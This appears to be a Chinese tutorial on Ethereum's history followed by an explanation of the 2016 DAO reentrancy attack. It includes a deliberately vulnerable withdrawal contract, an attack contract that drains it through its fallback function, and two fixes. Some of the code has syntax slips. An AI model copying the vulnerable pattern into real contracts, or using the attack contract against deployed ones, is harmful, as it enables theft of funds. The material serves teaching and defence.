# 以太坊起源和发展历史

参考资料：[https://ethereum.org/zh/history/](https://ethereum.org/zh/history/)

2013年末，以太坊Vitalik Buterin 发布了以太坊白皮书。

2014年，以太坊启动ICO(Initial Coin Offering)，在42天的时间里筹集了价值约1800万美元的比特币。

2015年7月30日，以太坊发布第一个版本Frontier（前沿），并在年底提出标准-ERC20。

2016年3月，以太坊推出**Homestead**升级。旨在提高以太坊的稳定性和安全性。该升级改进了EVM、智能合约开发工具和网络协议。

2016年5月至6月期间，以太坊社区经历了一次重大危机-The DAO事件。The DAO是一个去中心化自治组织，它的智能合约存在漏洞，导致攻击者能够窃取大量以太币，这次攻击事件中用的方法被称为重入攻击。这一事件引发分歧，以太坊分为了以太坊（ETH）和以太经典（ETC）两个不同的区块链。以太经典坚守不干涉代码的原则，继续维护以太坊创世区块不变。以太坊主张通过硬分叉恢复被盗以太币。

2017年，以太坊真正繁荣时刻。

2017年初，Ethereum Enterprise Alliance(EEA)成立，旨在促进以太坊区块链在企业界的应用。该联盟吸引了微软、IBM、英特尔等。

2017年10月，以太坊完成了Metropolis升级的第一阶段，称为”**Metropolis Byzantium**“。该升级引入一系列改进，包括更好的隐私保护、智能合约安全性的提高以及降低交易成本。

伴随主网升级，ICO热潮席卷，2017年，以太坊的智能合约平台成为许多新项目的首选，这些新项目通过ICO筹集资金。ICO热潮导致以太坊价格猛涨，从2017年初的几美元上涨到年底时的数百美元。这引发了全球的关注，以太坊成为加密货币市场的第二大市值货币。但也因此，交易和智能合约的激增导致以太坊日益严重的交易拥堵和燃料费用高的问题。

2018年初，以太坊和其他加密货币经历了一次巨大的价格崩溃。Ethereum 2.0的发展取得了重要进展，并确定了从PoW切换到PoS的总体路线。2018年，全球的监管机构开始对加密货币和ICO采取更严格的监管措施。2018年见证了去中心化金融（DeFi）生态的崛起，DeFi项目在以太坊上迅速发展，包括去中心化交易所、借贷平台和稳定币。

2019年，以太坊发布了Beacon Chain信标链；以太坊上DeFi生态爆发的一年；见证了区块链游戏的兴起；**君士坦丁堡升级**（旨在解决拜占庭实施过程中可能出现的任何问题，为从工作量证明过渡到权益证明奠定了基础）；圣彼得堡升级；伊斯坦布尔升级。

2020年，以太坊推出采用权益证明共识机制的信标链，信标链开始与以太坊主链并行运作。

2021年4月15日，**柏林升级**（通过降低特定 EVM 操作的 gas 成本，增加对多种交易类型的支持来优化以太坊）；2021年8月6日，**伦敦升级**（通过引入 EIP-1559 从而改革了交易费市场，并改变了 gas 退款的处理方式和冰河时代的时间表。EIP-1559 允许每次以太坊交易都燃烧固定数量的以太币，从而降低以太币整体的通胀。这个固定金额是每笔以太坊交易所需的基本费用，矿工的激励形式是在该基本费用之上的小费。虽然 EIP-1559 显著降低了 ETH 的通胀，但合并将减少 Ether 的发行量，使以太坊的基础货币实际上处于通缩状态）。

2022年9月15日，信标链成功运作一段时间后，以太坊区块链顺利实行合并，转为PoS。

2022 年 9 月 15 日，**巴黎升级**的主要特点是关闭工作量证明挖掘算法和相关的共识逻辑，而是打开权益证明。Paris 本身是对执行客户端的升级，使他们能够从连接的共识客户端获取指令。这需要一组新的内部 API 方法，统称为引擎 API。这可以说是自 Homestead 以来以太坊历史上最重要的升级。

2023年4月12日，**上海升级**，上海升级将质押提款引入执行层。 上海升级与卡佩拉升级同时进行，使区块能够接受提款操作，因此质押人可以将以太币从信标链提取到执行层。

## The DAO攻击

参考资料：[重入攻击和 DAO 被黑事件](https://blog.chain.link/reentrancy-attacks-and-the-dao-hack-zh/)

The DAO事件中，攻击方法被称为重入攻击。

主要表现为黑客部署了一个恶意合约，作为“投资者”在The DAO的智能合约中存入以太坊，The DAO合约会有一个状态变量记录每个投资者的投资余额。黑客之后调用The DAO合约中的`withdraw()`函数取回投资余额，黑客的合约没有实现`receive()`函数，而是实现了一个包含恶意代码的`fallback()`函数。所以当The DAO执行`withdraw()`函数给黑客合约转账时，会触发黑客合约的`fallback()`函数。黑客合约的`fallback()`函数会再次调用The DAO合约的`withdraw()`函数。因此就会导致The DAO合约一直给黑客合约转账。

下面是一个该攻击的简化示例。

```solidity
// SPDX-License-Identifier:MIT
pragma solidity ^0.8.10;
contract DAO {
    mapping(address=>uint256) public balances;
    function deposit() public payable {
        require(msg.value >= 1 ether, "Deposit must be no less than 1 Ether");
        balances[msg.sender] += msg.value;
    }
    function withdraw() public {
        // Check  user's balance
        require(balances[msg.sender] >= 1 ether, "Insufficient funds, cannot withdraw");
        uint256 bal = balances[msg.sender];
        // withdraw user's balance
        (bool sent, ) = msg.sender.call(value: bal)("");
        require(sent, "Failed to withdraw sender's balance");
        // update user's balance
        balances[msg.sender] = 0;
    } 
    function doBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```

发动重入攻击的合约：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;
interface IDAO {
    function withdraw() external;
    function deposit() external payable;
} 
contract Hacker{
    IDAO dao;
    constructor(address _dao){
        dao = IDAO(_dao);
    }
    function attack() public payable {
        // send the DAO with at least 1 ether
        require(msg.value >= 1 ether, "Need at least 1 ether to commence attack");
        dao.deposit{value: msg.value}();
        // withdraw from DAO
        dao.withdraw();
    }
    fallback() external payable {
        if(address(dao).balance >= 1ether){
            dao.withdraw();
        }
    }
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

攻击合约中的`attack()`函数调用The DAO合约的`withdraw()`函数，`withdraw()`函数会触发攻击合约的`fallback()`函数，而`fallback()`函数会再次调用The DAO合约的`withdraw()`函数，从而循环执行，导致The DAO合约给攻击合约转移远远超出其余额的资金。

### 解决方法

最简单的方法是改变The DAO合约中`withdraw()`函数的执行顺序。先`update user's balance`，再`withdraw user's balance`。也就是先更新状态，再转账。

另一种方法是The DAO合约使用函数修改器，将`withdraw()`函数”锁住“，让它在被重入的时候被这个锁挡住。示例代码如下：

```solidity
contract DAO{
    bool internal locked;
    modifier noReentrancy(){
        require(!locked, "No reentrancy");
        locked = true;
        _;
        locked = false;
    }
    // ......
    function withdraaw() public noReentrancy {
        // ...
    }
}
```

### fallback 函数

fallback函数是solidity中一个特殊的结构，在某些特殊的场景下会被触发。它有以下特点：

1. fallback函数不命名（比如：`fallback() external payable{}`）

2. 它们是被外部调用的（它们不能被自己合约内的函数调用）

3. 一个合约中只有0个或1个fallback函数，不能更多

4. 它们会在别的合约调用一个本合约中不存在的函数时被调用

5. 当ETH被发送给这个合约的时候，如果该交易没有calldata同时合约中没有`receive()`函数时，`fallback()`函数会被触发。这个场景下，fallback必须被标记为payable

6. `fallback()`函数可以包含自己的逻辑
